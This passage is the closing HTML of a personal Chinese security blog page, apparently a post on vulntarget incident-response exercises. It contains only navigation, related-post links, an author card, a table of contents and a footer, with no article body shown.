href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/04/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-ThermalPower/" title="春秋云境-ThermalPower"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">春秋云境-ThermalPower</div></div></div></a><a class="pagination-related  no-desc" href="/2025/05/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/" title="春秋云境-Brute4Road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">春秋云境-Brute4Road</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/05/01/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="2024长城杯决赛应急响应"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-01</div><div class="info-item-2">2024长城杯决赛应急响应</div></div></div></a><a class="pagination-related no-desc" href="/2025/05/04/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA-%E5%8C%BB%E9%99%A2%E8%84%B1%E5%BA%93%E5%BA%94%E6%80%A5%E5%A4%84%E7%90%86/" title="玄机-应急加固-医院脱库应急处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-04</div><div class="info-item-2">玄机-应急加固-医院脱库应急处理</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/" title="长城杯半决赛-应急响应+玄机-linux后门应急"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-30</div><div class="info-item-2">长城杯半决赛-应急响应+玄机-linux后门应急</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-b-01"><span class="toc-number">1.</span> <span class="toc-text">应急响应-vulntarget-b-01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">1.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">1.4.</span> <span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5"><span class="toc-number">1.5.</span> <span class="toc-text">5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6"><span class="toc-number">1.6.</span> <span class="toc-text">6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-j-01"><span class="toc-number">2.</span> <span class="toc-text">应急响应-vulntarget-j-01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1"><span class="toc-number">2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1"><span class="toc-number">2.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1"><span class="toc-number">2.4.</span> <span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-j-02"><span class="toc-number">3.</span> <span class="toc-text">应急响应-vulntarget-j-02</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">3.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2"><span class="toc-number">3.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2"><span class="toc-number">3.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2"><span class="toc-number">3.4.</span> <span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1"><span class="toc-number">3.5.</span> <span class="toc-text">5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1"><span class="toc-number">3.6.</span> <span class="toc-text">6</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/08/HNCTF2025/" title="HNCTF2025">HNCTF2025</a><time datetime="2025-06-08T15:37:49.000Z" title="发表于 2025-06-08 23:37:49">2025-06-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/04/D3CTF2025/" title="D3CTF2025">D3CTF2025</a><time datetime="2025-06-04T06:10:33.000Z" title="发表于 2025-06-04 14:10:33">2025-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/28/nssctf-pwn%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="nssctf-pwn入门题单">nssctf-pwn入门题单</a><time datetime="2025-05-28T01:35:03.000Z" title="发表于 2025-05-28 09:35:03">2025-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/26/LitCTF2025/" title="LitCTF2025">LitCTF2025</a><time datetime="2025-05-26T08:13:36.000Z" title="发表于 2025-05-26 16:13:36">2025-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化">python反序列化</a><time datetime="2025-05-08T06:37:06.000Z" title="发表于 2025-05-08 14:37:06">2025-05-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
